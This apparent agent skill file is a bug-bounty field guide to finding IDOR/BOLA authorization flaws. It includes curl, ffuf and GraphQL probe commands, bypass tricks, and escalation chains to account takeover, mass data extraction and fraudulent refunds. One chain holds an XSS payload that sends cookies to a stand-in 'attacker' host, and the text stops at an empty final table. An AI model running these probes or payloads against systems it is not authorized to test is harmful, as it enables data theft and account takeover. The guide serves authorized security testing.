---
name: hunt-idor
description: >-
  Hunt IDOR / BOLA / broken object-level authorization — the #1 OWASP API risk
  (API1:2023, CWE-639) and the highest-frequency paid web bug class. Draws on
  450 disclosed HackerOne reports (bounty stats, bypass tricks, ffuf/nuclei
  commands, wordlists, 30+ mined report lessons, 6 case studies) plus a
  39-report hunting skill with crown-jewel asset taxonomy, GraphQL-specific
  IDOR, a 10-step methodology, root-cause→secure-code patterns, 6 senior
  escalation chains, and a Gate 0 reproducibility bar. Enhanced with
  identifier taxonomy (UUIDv1/Hashids/encrypted IDs), shadow-API IDOR, JWT
  claim-trust, WebSocket frame IDOR, signed-URL IDOR, GraphQL field-level +
  directive abuse, BOPLA mass-assignment chaining, soft-delete/race IDOR,
  cache/header/pagination/tenant-resolution bypasses, and verified 2025–2026
  advisories. Use whenever hunting IDOR/BOLA, reviewing source for missing
  object-level authz, or triaging a finding — especially when basic ±1
  swapping returns 403 and a bypass or stronger impact chain is needed.
metadata:
  sources: hackerone_public, github, portswigger_research, binarysecurity_research
  report_count: 450 + 39
---

# IDOR / BOLA Hunting — Complete Field Guide

Merged from a **450-report HackerOne field guide** and a **39-report hunting skill**, then extended with additional bypass technique and 2025–2026 advisories. Organized as a workflow: **find it → confirm the differential → classify the identifier → bypass the guard → chain to impact → meet the pre-report gate**.

**Core principle, applies throughout:** an IDOR is not a finding until you have demonstrated a **cross-account differential with two controlled identities** — same request, same object ID, different session, different data (or a different state change). A 200 alone is not a finding; a 200 that returns the *victim's* data is.

---

## Signal

- Reports: **450** · paid: **107**
- Median bounty **$500** · p90 **$5,000** · max **$20,000** · total **$199,099**
- Median upvotes **31**

### Where it pays (450-report corpus)

| Program | Reports | Bounty | Upvotes |
|---|---:|---:|---:|
| GitLab | 12 | $44,550 | 858 |
| Mail.ru | 37 | $24,260 | 971 |
| New Relic | 18 | $19,250 | 379 |
| HackerOne | 20 | $18,000 | 3370 |
| Snapchat | 1 | $15,000 | 801 |
| Reddit | 7 | $10,500 | 813 |
| PayPal | 1 | $10,500 | 797 |
| GitHub | 6 | $10,000 | 657 |

### Industry context (2025–2026)

- BOLA has ranked **#1 on the OWASP API Security Top 10 since 2019** and remains **API1:2023**; CWE classifies it as **CWE-639 (Authorization Bypass Through User-Controlled Key)**.
- HackerOne 2025 data: IDOR reports increased **18–29% year-over-year**; IDOR represents **36% of medical-tech bounties**, **31% of professional-services bounties**, and **financial-services IDOR is up 47% vs. 2023**.
- IDOR is widely described as the highest-frequency, second-highest-value bug class in modern bug bounty after RCE; roughly 40% of observed API attacks in production environments are BOLA.
- IDOR chains pay **$10K+** when chained (mass assignment, ATO, financial impact); standalone read-IDOR is Low–Medium.

---

## Crown-jewel targets & asset taxonomy

### Highest-value asset types (by payout potential)

| Asset Type | Why It Pays |
|---|---|
| Financial documents / billing APIs | PII + financial data exposure (Shopify, Uber, PayPal) |
| Private repositories / source code | IP theft, critical data loss (GitHub) |
| User messages / DMs | Privacy violation at scale (Reddit) |
| Account-management endpoints | User addition, deletion, privilege escalation (PayPal, Mozilla) |
| Business/org administration | Cross-tenant escalation, employee PII (Uber) |
| Content moderation/admin actions | Operational sabotage (Reddit mod logs) |
| Signed-URL / attachment endpoints | Private media, exports, KYC documents |
| WebSocket / GraphQL / mobile APIs | Authz often missing at frame- or field-level |

### Programs that pay most

- Platforms with **multi-tenancy** (SaaS, B2B tools)
- **Fintech and payment processors**
- **Social platforms with private content**
- **Developer tools with org/repo isolation**

---

## Pre-report gate (read first)

Before any report, answer all three — and confirm the differential.

### 1. What can the attacker DO right now?

Be specific: *"Attacker with a valid account can send `GET /api/v1/invoices/{victim_invoice_id}` and receive the victim's full billing document including name, address, and payment amount — without any relationship to that account."*

### 2. What does the victim LOSE?

Map to CIA:
- **Confidentiality** — data exposed
- **Integrity** — data modified / content deleted
- **Availability** — data destroyed / account locked out

Vague answers ("the victim loses privacy") fail. *"Victim loses confidentiality of private financial records"* or *"Victim's content is deleted by a third party"* is the bar.

### 3. Can it be reproduced in 10 minutes from scratch?

- Two fresh accounts created ✓
- Exact HTTP request documented with victim's ID ✓
- 200 OK response showing victim's data (or confirmed state change) ✓
- No reliance on pre-existing state or timing ✓

If you can't demo it reproducibly, do not file the report.

### The 200-but-no-data trap (the #1 N/A driver)

An IDOR that returns **200 with an empty array, redacted fields, or `"access denied"` in the body** is not a finding — it's a broken status code. Always body-diff against a legitimate own-object response. If the fields you wanted are missing, the endpoint *is* authz'd, just with the wrong status. Similarly, an error response that leaks *some* victim data in a nested field (e.g. `context.subject`) **is** a finding — see HackerOne #3862641 (§7.1).

### Half-blind IDOR — don't classify as "no" too early

If the direct response is empty, check:
- error messages that echo victim object fragments
- async job/event objects (provisioning events, export status)
- rendered documents (PDFs, CSV exports, screenshots)
- GraphQL `errors` array — resolvers sometimes leak data in `extensions`
- secondary endpoints that consume the same ID (a "check status" endpoint may be less protected than the "get" endpoint)

---

## Part 1 — Discovery: where object references live

### 1.1 URL patterns that scream IDOR

```
/api/v1/users/{id}/
/api/v*/orders/{order_id}
/invoices/download?id=
/reports/{uuid}/
/messages/{thread_id}
/admin/orgs/{org_id}/members
/migration/{migration_id}/files
/graphql (query params with IDs)
/api/business/{business_id}/
/vouchers/{voucher_id}/policy
/api/v1/users/{id}/orders/{order_id}/items/{item_id} (nested REST)
/api?file=42 (legacy query)
?invoiceId= (query-param object ref)
```

### 1.2 Identifier types — each has a different testing approach

| Identifier type | How to attack it |
|---|---|
| **Sequential integer** | decrement / increment ±1, ±100; `id=0`, `id=-1`, `id=null` |
| **UUID v4** | random — harvest another UUID from signup, invite, share, public listing, JS bundle, notification email, webhook payload |
| **UUID v1** | time-based — derivable if you know approximate creation time and node ID; libraries exist |
| **base64-encoded JSON** (`eyJp...`) | decode, swap ID, re-encode; check whether padding/format is validated |
| **Hashids / shortlinks** | try the salt (often leaked in JS bundle or defaults); brute-force with common salts |
| **Encrypted IDs** | try IV reuse / padding oracle (rare but devastating); look for AES-CBC patterns and fixed IVs |
| **Slug** | often derivable from username/title; try victim's known slug |
| **Composite keys** | `org:1:user:2` — swap one component at a time |
| **GID / Relay global ID** | `gid://app/Model/123` or `base64("Type:123")` — decode, increment, re-encode |

### 1.3 JavaScript source patterns

```javascript
fetch(`/api/v1/users/${userId}/profile`)
axios.get('/invoices/' + invoiceId)
graphql query { billingDocument(id: $docId) }
// Redux/state stores exposing foreign IDs
state.currentUser.organizationId
```

### 1.4 Response / header signals

- `Content-Type: application/json` on endpoints accepting raw IDs
- No `X-Frame-Options` or CORS misconfigs paired with ID params
- `Authorization: Bearer` tokens that are user-scoped but hit org-level resources
- `Location` headers, error messages, or metadata that leak internal IDs

### 1.5 Tech-stack signals

- GraphQL endpoints — query-based IDORs are often missed (§4)
- REST APIs with sequential integer IDs — most vulnerable
- UUIDs that are predictable or leaked in other responses
- Multi-tenant SaaS with `org_id`, `account_id`, `business_id` params
- Mobile apps — Burp the APK; mobile APIs often skip authorization checks
- Legacy / v0 / internal endpoints — mine JS bundles and Wayback for `/internal/`, `/v0/`, `/legacy/` siblings of protected routes (§3.4)

---

## Part 2 — Payloads & probes

### 2.1 Basic numeric / UUID / encoded swaps

```
id=1 -> id=2, id=0, id=-1, id=999999
UUID swap: use a known UUID from another account
base64 decode/encode the ID
hex encode the ID
JWT sub claim as the ID source
gid://app/Model/123 -> increment the numeric tail
```

### 2.2 Batch / array

```
{"ids":[1,2,3]}          or repeated  id=1&id=2
id[]=victim              array-style
```

### 2.3 Nested / composite

```
/users/1/orders/2        user 1 but order 2
/invoice/9/line/1
```

### 2.4 IDOR via HTTP method tampering

```bash
for method in GET POST PUT PATCH DELETE OPTIONS HEAD; do
  echo "=== $method ==="
  curl -s -X $method \
    -H "Authorization: Bearer USER_B_TOKEN" \
    https://target.com/api/v1/users/USER_A_ID/profile
done
```

### 2.5 Verb-override headers

```
X-HTTP-Method-Override: GET
X-Method-Override: PUT
X-HTTP-Method: DELETE
_method=DELETE            (body)
```

### 2.6 GraphQL probes

```bash
# Introspection
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"query{__schema{types{name,fields{name}}}}"}'

# Direct object IDOR
curl -s -X POST https://target.com/graphql \
  -H "Authorization: Bearer USER_B_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ billingDocument(id: \"USER_A_DOC_ID\") { id amount pdfUrl } }"}'

# node() global-ID IDOR — often exposes every type even when named queries are locked down
-d '{"query":"{ node(id:\"VXNlcjp2aWN0aW1VVUlE\") { ... on User { email phone } } }"}'
```

### 2.7 JavaScript scraping for leaked IDs

```bash
# Find IDs in JS bundles
curl -s https://target.com/static/app.js | grep -Eo '"id":"[a-f0-9-]{36}"' | sort -u

# Find object references in API responses
curl -s -H "Cookie: session=USER_A" \
  https://target.com/api/v1/dashboard | python3 -m json.tool | grep -i "_id"
```

### 2.8 Sequential enumeration with ffuf

```bash
ffuf -u "https://target.com/api/v1/orders/FUZZ" \
  -w ids.txt \
  -H "Authorization: Bearer USER_B_TOKEN" \
  -mc 200 \
  -o idor_results.json

# ids.txt generated around a known value
python3 - <<'PY'
known_id = 48291
with open("ids.txt", "w") as f:
    for i in range(known_id - 500, known_id + 500):
        f.write(str(i) + "\n")
PY
```

### 2.9 Source-code grep patterns

```bash
# Missing authorization checks in common frameworks
grep -r "findById\|findOne\|getById" --include="*.js" .
grep -r "params\[:id\]\|params\['id'\]" --include="*.rb" .
grep -r "request\.args\.get\('id'\)" --include="*.py" .

# Direct ORM queries without user scoping
grep -r "Model\.find(params" --include="*.js" .
# secure pattern:  Model.find({ id: params.id, userId: req.user.id })
```

### 2.10 Payload fragments observed (from 450-report corpus)

Recurring fragments from writeups. Adapt, don't paste blindly.

```
MembershipRequest::getMembership()
link()
victim@email.com
MembershipService::getMembership()
Move to > My Content
application%5Bid%5D
/BugReport/Admin/Attachment/{id}
attacker@email.com
getMembership()
LocalController::link()
<PUT_VICTIM_EMAIL_HERE>
exmaple: GET /api/v1/users/@hasn0xxxx
```

### 2.11 Parameters observed

`id` · `type` · `action` · `message` · `userId` · `Password` · `aura.context` · `aura.pageURI` · `aura.token` · `file` · `domain` · `PID` · `RNo` · `time_range` · `accounts` · `passChange` · `__RequestVerificationToken` · `ConfirmPassword` · `export_columns` · `start`

---

## Part 3 — Bypass techniques (beyond basic swapping)

### 3.1 Path / parameter tricks

```
/api/users/123      ->  /api/users/123/
                    ->  /api/users/123/.json
                    ->  /api/users/123;
                    ->  /api/Users/123                 (case)
                    ->  /api/users/12%33               (URL-encode a digit)
                    ->  /api//users/123                (double slash)
? id=victim&id=mine      (parameter pollution; try both orders)
? id[]=victim             (array)
? id=*                    (wildcard)
? id=%                    (wildcard)
? id=-1, id=null, id=0    (negative / null / zero)
```

### 3.2 HTTP method gaps

An endpoint may forbid GET but allow POST, PUT, PATCH, DELETE, HEAD, or OPTIONS. HEAD is especially useful — it can return headers (and sometimes content-length) without triggering body-level authz.

```
GET  /api/users/123  -> 403
POST /api/users/123  -> 200
PUT  /api/users/123  -> 200
HEAD /api/users/123  -> 200  (headers, sometimes content-length oracle)
```

### 3.3 Verb override

```
X-HTTP-Method-Override: GET
X-Method-Override: PUT
X-HTTP-Method: DELETE
_method=DELETE            (in body)
```

### 3.4 Shadow / legacy API endpoints

The web UI calls `/api/v1/users/{id}` (authz enforced), but legacy `/internal/users/{id}`, `/v0/users/{id}`, or `/legacy/` siblings may skip authz entirely. Mine JS bundles and Wayback Machine for old paths; authorization logic is often version-specific, so test `/v1/` and `/v2/` separately even when one appears fixed.

### 3.5 JWT user_id claim trust

The JWT contains `user_id`; the app also accepts a `user_id` in body/query, and the server uses the query value. Swap the query value → IDOR without touching the token. Also test whether the server honours `sub` / `uid` / `accountId` claims over session identity.

### 3.6 GraphQL specifics

- **Field-level IDOR** — the resolver auths the parent object but not nested relations; `node(id:)` often exposes every type even when named queries are locked down.
- **Alias-based abuse** — send many aliases in one request to brute-force IDs or bypass per-alias rate limits.
- **Batched queries** — GraphQL batching can amplify enumeration and evade per-request rate limits.
- **parseRefs / directive abuse** — Craft CMS CVE-2026-28696: the `@parseRefs` directive could be abused by authenticated users and unauthenticated guests (with a Public Schema) to read sensitive attributes of any element.
- **Mutation injection** — field-level authz missing on mutations (`updateUser`, `deleteOrg`, `transferBilling`).

### 3.7 WebSocket frame IDOR

WebSocket auth often happens only at handshake; subsequent frames are trusted. Sniff frames, modify `id` fields, and observe whether the server re-checks ownership per message.

### 3.8 Signed / pre-signed URL IDOR

A very common 2025–2026 pattern: the signing step is authz'd, but the ID fed into the signing step is not. The result is a signed URL for the victim's object.

- **paopao-ce** ≤0.6.0-alpha.3 — `DownloadAttachment` enumerated sequential `post_content` IDs and returned signed download URLs for other users' private / friend-only / follower-only images and videos (CVE-2026-111649, CVSS 7.1).
- **Decidim** — `DownloadYourDataController#download_file` confirmed export ownership, then redirected to a Rails Active Storage signed URL not bound to the session — anyone with the GET link could download the export.
- **Generic pattern** — get a pre-signed URL the normal way, capture both the signing request and the signed URL, then replay the signing request with a victim object ID. An IDOR with a cloud signature on top.

### 3.9 Bulk / batch / export endpoints

List, search, export, and batch endpoints often apply weaker authz than detail endpoints. Test:

- `POST /api/export {"ids":[...]}`
- `POST /api/batch`
- `?sort=id`, `?filter[user_id]=`
- CSV/PDF export generators

### 3.10 Indirect reference via related objects

Object A (accessible) contains a reference to Object B (should be private). The developer protects direct access to B but not the indirect reference through A. Harvest IDs from notification emails, webhook payloads, metadata, GraphQL introspection, and export files, then replay against the restricted endpoint.

### 3.11 Mass assignment (BOPLA) — the under-tested cousin

App accepts JSON and copies fields straight to the model:

```js
user.update(req.body)          // node
User.update(params)            // rails, strong_parameters not used
Object.assign(entity, body)    // generic
```

Inject extra fields:

```json
{ "name":"foo", "email":"foo@x.com", "is_admin":true, "role":"admin", "permissions":["*"], "workspaceId":"VICTIM_WS" }
```

- **IXP Manager** — authenticated `AUTH_CUSTUSER` could overwrite another user's API key (including superuser) by addressing `api_keys.id` directly, then authenticate as that user.
- **FlowiseAI** — mass assignment on `workspaceId` and `id` in Evaluator / Assistant / DatasetRow / CustomTemplate controllers → cross-workspace data takeover and IDOR.
- **Chain primitive** — set `user_id` / `owner_id` to a victim to combine with IDOR, or flip `verified` to skip email/2FA gates.

### 3.12 Soft-delete / temporal IDOR

The "remove member" endpoint flips an `active=false` flag but does not invalidate the session / PAT. Capture the token before removal, have the admin remove the user, then re-issue API calls — the cached auth context still passes even though the policy table says the user no longer has permission. Weeks of post-termination cross-tenant access; GDPR/CCPA exposure (see Chain 5).

### 3.13 State-machine / race IDOR

Authorization checked at creation time, not at access time. Invites/tokens remain valid after the granting permission is revoked. Test:

- expired invites that can still be accepted
- race conditions on resource IDs (two simultaneous requests)
- state transitions that skip re-authz

### 3.14 OpenAPI spec-driven testing

If the target publishes an OpenAPI/Swagger spec, parse it and enumerate every GET that takes an object ID, then probe each with altered IDs and stripped auth. This is spec-driven, two-user, GET-only — fast and high-coverage.

### 3.15 Bypass-vs-defense table

| Defense | Bypass |
|---|---|
| UUIDs instead of sequential integers | Harvest UUIDs from other responses, emails, webhooks, JS, GraphQL introspection; replay against restricted endpoints |
| Indirect / hashed object references | Decode the hash (often base64); find the original ID in another response (`echo "dXNlcl8xMjM0NQ==" | base64 -d` → `user_12345`) |
| Short-lived per-resource tokens | Test whether the token is actually bound to the object or only validated for format — reuse your own token against a victim ID |
| Rate limiting on enumeration | Slow enumeration (1 req / 5 s), distributed IPs, or use non-enumeration IDORs (you already know the target's ID from another leak) |
| `user_id` check in WHERE clause | Test the same endpoint on a different API version (`/v1/` vs `/v2/`); check JS bundles for older version calls |
| CORS restrictions | IDOR doesn't require cross-origin exploitation — you test API endpoints directly with your own session |
| "Opaque" server-side references | Look for any endpoint that returns the internal ID (Location headers, error messages, metadata), then use it elsewhere |
| WAF / parameter filtering on `id` | Nested JSON `{"data":{"id":"VICTIM"}}`, HPP `?id=own&id=victim`, parameter-name variations (`user_id`, `userId`, `uid`, `account`) |

---

## Part 4 — GraphQL IDOR (deep dive)

GraphQL is "one endpoint, infinite attack surface" — the IDOR factory.

### 4.1 Detection

```bash
for path in /graphql /graphiql /api/graphql /v1/graphql /v2/graphql /query /api/query /__graphql /altair; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com$path")
  [[ "$code" != "404" ]] && echo "[$code] $path"
done
```

### 4.2 Fingerprint the engine

`graphw00f` identifies Apollo / Hasura / Graphene / Yoga / AppSync / Sangria — each has different IDOR-prone defaults (e.g. Apollo introspection on in dev, Hasura direct DB access).

### 4.3 Introspection → enumerate every ID argument

If introspection is on, pull the schema, then for every query and mutation taking an `id` argument, substitute another user's ID. Test both queries (read) and mutations (write/delete).

### 4.4 Field-level IDOR

The top-level `node(id:)` resolver auths the requester, but nested relations do not re-check ownership against the resolved object:

```graphql
{ node(id:"<victim_gid>") {
    ... on Customer {
      email
      orders { totalPrice
        paymentMethods { cardLast4 } } } } }
```

Iterate IDs (decode base64 to numeric, increment) to exfil emails, order totals, payment methods across the entire customer base.

### 4.5 Aliases + batching

- Use aliases to send dozens of ID probes in one request.
- GraphQL batching can bypass per-request rate limits and amplify enumeration.
- CREATE→DELETE→READ synthesis is a known UAF / authz-testing pattern.

### 4.6 Directive abuse

Craft CMS `@parseRefs` (CVE-2026-28696) is the canonical 2026 example: the directive intended to parse internal reference tags could be abused by authenticated users and unauthenticated guests with a Public Schema to read sensitive attributes of any element. Test any directive that resolves references or fetches by ID.

### 4.7 Persisted-query / allowlist bypass

Some GraphQL deployments only enforce an operation allowlist on *named* persisted queries sent by hash/ID; the same schema often still accepts raw, non-persisted queries on the same endpoint if the allowlist check is implemented as a pre-filter rather than a hard gate. Test sending the full raw query text instead of the persisted-query hash — if it's accepted, the entire schema is reachable regardless of what's on the allowlist.

---

## Part 5 — Methodology (step by step)

1. **Map all object references** in the application. Browse every feature as User A, capture all requests in Burp, filter for `id=`, `_id=`, `uuid=`, `/v1/{noun}/{id}`, and query params with numeric/UUID values.
2. **Enumerate ID types** (§1.2) — sequential, UUIDv1/v4, base64, Hashids, composite, GID.
3. **Create two separate accounts at the same privilege level.** User A = resource owner; User B = attacker. Log all IDs belonging to A while authenticated as A.
4. **Replay A's resource IDs as B.** Replace session cookie/token with B's credentials, send identical requests referencing A's object IDs. Test all HTTP verbs on each endpoint.
5. **Test cross-tenant / cross-org scenarios.** Create accounts in separate organizations and test whether Org B's session can reference Org A's IDs — especially admin/management endpoints.
6. **Test GraphQL specifically** (§4) — introspection, `node(id:)`, field-level IDOR, aliases, mutations.
7. **Test write / destructive operations, not just reads.** Can B delete A's resources? Modify A's content? Add themselves to A's account?
8. **Chain IDORs together.** One IDOR's leaked data (org IDs, user IDs) fuels the next → privilege escalation.
9. **Test state-changing edge cases.** Expired tokens/invites that can still be accepted; race conditions; indirect refs (`?sort=id`, `?filter[user_id]=`).
10. **Document the exact differential.** Confirm B has no legitimate access to A's resource; screenshot the 200 OK vs expected 403/404.

Then run the pre-report gate (above) and, if chaining, Part 6.

---

## Part 6 — Escalation chains (senior hunting)

Standalone IDOR gets paid Low–Medium for cross-tenant read. The real money is chaining IDOR to a state-change primitive that doesn't normally permit cross-tenant action — turning "I can see victim's data" into "I own victim's account." The six chains below are among the highest-paying IDOR compositions on modern bug-bounty programs.

**Chain 1 — IDOR on `/api/users/{id}/email` + missing re-auth → password reset → ATO**
A. `PUT /api/users/{victim_id}/email {"email":"attacker@evil"}` from attacker's session — server changes the victim's email without ownership check.
B. Hit the password-reset flow — server emails the reset link to the new (attacker's) email.
C. Open the reset link, set a new password, log in as victim.
Impact: Silent ATO — victim sees no email-change notification because the change happens via API, not via the user-facing UI that has its own audit log.

**Chain 2 — IDOR on file-download + filename-controlled Content-Disposition → reflected XSS via download → session theft**
A. IDOR on `/api/files/{id}/download` returns any user's file given the ID.
B. The download endpoint sets `Content-Disposition: attachment; filename="<user-supplied-filename>"` without sanitising newlines or quotes — attacker uploads a file named `"; <script>fetch('https://attacker/x?c='+document.cookie)</script>; foo.txt`.
C. Victim navigates to download → browser interprets the injected script in the response-header context as HTML → JS runs same-origin → cookie/token exfil.
Impact: ATO via IDOR + filename-controlled response header — neither primitive alone is critical; the chain is.

**Chain 3 — IDOR via GraphQL `node(id:)` GID + Relay relation traversal → cross-tenant mass data extraction**
A. Target uses Relay-style global IDs (`gid://shopify/Customer/<n>` or `base64(type:id)`).
B. `node(id:"<victim_gid>") { ... on Customer { email orders { totalPrice paymentMethods { cardLast4 } } } }` — the top-level resolver auths the requester, nested relations don't re-check ownership.
C. Iterate IDs (decode base64 → numeric → increment) to exfil emails, order totals, payment methods across the customer base.
Impact: Mass cross-tenant PII / financial data extraction. Single bug, full database.

**Chain 4 — IDOR on `/api/teams/{id}/members` + mass assignment in body → role escalation on victim team**
A. `POST /api/teams/{victim_team_id}/members {"email":"attacker@evil"}` adds attacker as a normal member without ownership check.
B. The body accepts additional unfiltered fields: `{"email":"attacker@evil", "role":"OWNER", "permissions":["*"]}`.
C. Attacker is added as OWNER — full admin access to the victim team's resources, can remove real owners.
Impact: Cross-tenant privilege escalation via IDOR + mass assignment.

**Chain 5 — Soft-delete IDOR + post-removal token validity → persistent cross-tenant access**
A. Identify the "remove member" endpoint that flips `active=false` but doesn't invalidate the session/PAT.
B. Log in as the to-be-removed user; capture session cookie or PAT.
C. Have the org admin remove the user via the normal flow. Wait. Re-issue API calls using the captured token — IDOR is now temporal (the user no longer has permission per the policy table, but the cached auth context still passes).
Impact: Weeks of post-termination cross-tenant access; GDPR/CCPA breach exposure; potential extortion leverage.

**Chain 6 — Double IDOR (`/users/{id}/orders` → `/orders/{order_id}/refund`) → financial impact on victim merchant**
A. First IDOR: `GET /api/users/{victim_id}/orders` returns the victim's order list without ownership check — yields legitimate `order_id` values.
B. Second IDOR: `POST /api/orders/{order_id}/refund` issues refunds without checking that the requester owns the merchant/order.
C. Trigger refund on each of the victim merchant's recent orders. Money moves from merchant to customer (attacker-controlled).
Impact: Direct financial loss to the victim merchant. Mass-exploitable across the platform's merchant base.

**Operator-level pattern:** When you confirm a read-IDOR at A, immediately ask: what state-change accepts the same ID and might also be IDOR'd? The chain is usually one of: (1) password reset / email change at the terminal step → ATO; (2) refund / withdraw / transfer → financial; (3) role-change / membership-add → privilege escalation. If your read-IDOR doesn't compose to one of those, the standalone payout is what you get. Hunt for both halves — the second is often easier to find because it shares the same auth bug class as the first.

Cross-references: hunt-ato (Chains 1, 5), hunt-xss (Chain 2), hunt-graphql (Chains 3, 4), hunt-misc (Chain 5), hunt-business-logic (Chain 6).

---

## Part 7 — Techniques from real reports

### 7.1 One concrete lesson per report (450-report corpus, newest and most-upvoted first)

Read 5–10 before testing.

- Delete anyone's content spotlight remotely — #1819832 · Snapchat · $15,000 · ▲801 — `DeleteStorySnaps` GraphQL mutation accepted arbitrary `ids` for a `storyType`.
- IDOR allows user to access report details via reference.json endpoint — #3862641 · HackerOne · $15,000 · ▲372 — `POST {}` to `/reports/{id}/reference.json` returned an access-denied error that still leaked report details in `context.subject`.
- Insecure Direct Object Reference (IDOR) - Delete Campaigns — #1969141 · HackerOne · $0 · ▲346 — swap the campaign id parameter for another program's ongoing campaign id.
- Attachment disclosure via summary report — #2442008 · HackerOne · $0 · ▲340.
- Arbitrary Read of Another Users private repository without Authorization — #3124517 · GitHub · $10,000 · ▲276 — CVE-2025-8447.
- Deleting all DMs on RedditGifts.com — #1213237 · Reddit · $5,000 · ▲267 — change cookies/CSRF token and the message ID to your own.
- IDOR Allows Viewing Private Report Details via /bugs.json Endpoint — #2487889 · HackerOne · $0 · ▲266 — leaked title, url, id, state, substate, severity, timestamps, reporter name.
- Singapore - Account Takeover via IDOR — #876300 · Starbucks · $0 · ▲260 — alternate site shared database and cookie credentials with another regional property.
- Steal private objects of other projects via project import — #743953 · GitLab · $20,000 · ▲254 — foreign keys (issue ids, merge request ids) weren't excluded during import.
- IDOR: Account Deletion via Session Misbinding — #3154983 · Mozilla · $0 · ▲244 — `POST /v1/account/destroy` with attacker's session but the victim's email and authPW deleted the victim's account.
- Insecure redirect rule results in bypassing ban redirect — #703058 · Roblox · $0 · ▲233 — append `/membership/` after `.aspx`/`.ashx` extensions.
- IDOR enumeration disclosing email and phone number within cashier — #1966006 · Unikrn · $0 · ▲232.
- IDOR delete any Tickets on ads.tiktok.com — #1475520 · TikTok · $0 · ▲216 — via the "draft order id" parameter.
- IDOR allowing unauthorized use of another user's saved credit card at checkout — #391092 · Yelp · $0 · ▲214.
- IDOR vulnerability in unreleased HackerOne Copilot feature — #2218334 · HackerOne · $0 · ▲210 — captured `data.newConversation.llm_conversation.id` from Proxy History.
- IDOR allows an attacker to modify the links of any user — #1661113 · Reddit · $0 · ▲208 — swap the saved `id` in the request body.
- IDOR when editing users leads to Account Takeover without User Interaction — #915114 · Automattic · $0 · ▲202 — `GET /users/invite-user.php?id=(userid)&popup=1`.
- IDOR on GraphQL queries BillingDocumentDownload and BillDetails — #2207248 · Shopify · $5,000 · ▲187 — leaked other merchants' billing data via the invoice id.
- IDOR Vulnerability at AddTagToAssets operation name — #2633771 · HackerOne · $0 · ▲178 — `tagId` parameter carried base64 ciphertext.
- IDOR leads to Edit Anyone's Blogs / Websites — #974222 · Automattic · $0 · ▲177 — swap the `hidBlogID` parameter.
- Unauthorized Access to TikTok Account [Private Videos] via API Endpoint — #2868084 · TikTok · $0 · ▲167.
- Getting access of mod logs from any public or restricted subreddit — #1658418 · Reddit · $5,000 · ▲163 — pagination cursor manipulation.
- Unreleased CTF Levels revealed via `/group/user/ID1?user=USERID` — #536853 · HackerOne · $0 · ▲161.
- Email change / personal data change leading to ATO — #1250037 · Stripe · $3,000 · ▲149 — IndieHackers email-change flow.
- Disclose Hidden Comments on Media Section — #2541962 · pixiv · $500 · ▲149 — intercept any POST to `hub.vroid.com` and replay.
- Importing GitLab project archives can replace uploads of other users — #534794 · GitLab · $0 · ▲148.
- IDOR vulnerability (Price manipulation) — #1403176 · Acronis · $0 · ▲146 — manipulate the product ID post-purchase to change price.
- Applicant security exam attachments accessible via IDOR/BAC on a custom Apex controller — #2950536 · U.S. Dept Of Defense · $0 · ▲142.
- Missing ownership check on remote wipe endpoint — #819807 · Nextcloud · $500 · ▲141 — swap `data-id` to the victim's device ID.
- IDOR and statistics leakage in Orders — #544329 · X/xAI · $289 · ▲141.

### 7.2 Detailed case studies

- **Delete anyone's content spotlight remotely** — #1819832 · Snapchat · $15,000 · high · 2023-03-06 · ▲801. Log in to `my.snapchat.com/myposts`, intercept the delete request, swap the ID.
- **IDOR to add secondary users** — #415081 · PayPal · $10,500 · high · 2019-07-30 · ▲797. PayPal Business accounts allow owners to create secondary users; the endpoint let an owner assign secondary users from other accounts, granting unauthorized access.
- **IDOR - Delete all Licenses and certifications via CreateOrUpdateHackerCertification GraphQL query** — #2122671 · HackerOne · $0 · high · 2023-08-29 · ▲395. Changing the ID in the mutation deletes other users' certifications; iterating IDs deletes an entire range.
- **IDOR allows user to access report details via reference.json endpoint** — #3862641 · HackerOne · $15,000 · critical · 2026-10-01 · ▲372. A VDP account could `POST {}` to `/reports/{id}/reference.json`; despite an HTTP 422 access-denied body, the error response leaked additional report details in `context.subject` — a textbook half-blind IDOR.

### 7.3 Real impact examples (scenario form)

- **Scenario 1 — Financial data exposure + cross-account billing fraud (Uber-style).** One IDOR reads any organization's voucher policy (org IDs, employee emails, payment methods); a second modifies voucher policies using those leaked IDs — chained, this redirects charges to an arbitrary business account and exposes employee PII across organizations.
- **Scenario 2 — Private repository read via IDOR on migration endpoint (GitHub-style).** A migration feature's `migration_id` isn't validated against the authenticated user's ownership; substituting another user's migration ID grants read access to private source code.
- **Scenario 3 — Account takeover chain via message IDOR (Reddit-style).** Substituting `thread_id` exposes another user's private messages, which include a session/verification token sent internally; the attacker uses it for account recovery, escalating a read-only IDOR into full ATO.

### 7.4 Verified 2025–2026 advisories / CVEs

| Reference | Root-cause lesson |
|---|---|
| CVE-2026-28696 — Craft CMS `@parseRefs` GraphQL directive | Directive intended to parse internal references could be abused by authenticated users and unauthenticated guests (Public Schema) to read sensitive attributes of any element |
| CVE-2026-111649 — Rocboss paopao-ce `DownloadAttachment` | Sequential `post_content` IDs enumerated via `/v1/attachment` → signed download URLs for other users' private media (CVSS 7.1) |
| CVE-2026-79957 — ServiceNext `/api/Usuario/GetUsuarios` | User-controlled numeric ID; harvested credentials reused in credential-stuffing / lateral movement |
| CVE-2026-133173 — WatchAlert `/api/w8t/datasource/dataSourceGet` | Lookups omit `tenant_id` filtering → authenticated users read other tenants' datasources |
| CVE-2026-81031 — IDURAR ERP CRM password update | Changes the password of whichever account the request names rather than the requesting account |
| CVE-2026-77369 — Yjs WebSocket route | Session required but resource selected by `typename.referenceId.columnName` room name is not authorized; bidirectional sync reads/writes the selected column without CanRead/CanUpdate checks |
| Open WebUI `/api/v1/notes/{note_id}` | Authenticated users retrieve other users' notes by guessing/enumerating UUIDs |
| FlowiseAI Evaluator / Assistant / DatasetRow / CustomTemplate | `Object.assign(entity, body)` → client-controlled `workspaceId` and `id` → cross-workspace data takeover and IDOR |
| IXP Manager API-key update | IDOR/BOLA + mass assignment: low-privileged user overwrites superuser's API key by addressing `api_keys.id`, then authenticates as that user |
| Decidim `DownloadYourDataController` | Ownership checked, then redirected to a Rails Active Storage signed URL not bound to the session — link bearer can download the export |

Research hygiene: reopen the vendor advisory before citing affected/fixed versions in a live report — CNA, NVD, and vendor notes can disagree.

---

## Part 8 — Root causes → secure-code patterns

| # | Root cause | Vulnerable pattern | Secure pattern |
|---|---|---|---|
